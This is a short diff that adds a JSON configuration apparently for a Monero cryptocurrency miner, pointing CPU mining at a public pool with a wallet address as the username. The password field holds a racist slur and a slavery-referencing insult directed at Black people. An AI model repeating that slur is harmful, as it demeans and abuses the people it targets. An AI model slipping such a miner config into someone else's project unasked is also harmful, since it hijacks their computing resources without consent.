@@ -1,0 +1,15 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:443",
+            "user": "46M6REEQUHtKu3wuqNrQAY3obdfxNi3gF5DaK51NWyoqaPZEvSdReHmd5nGtHFU7FcbEmMr7kZCFs3C8AghA7NU4GFpwjp7",
+            "pass": "NIGGER WORK THAT COTTON",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
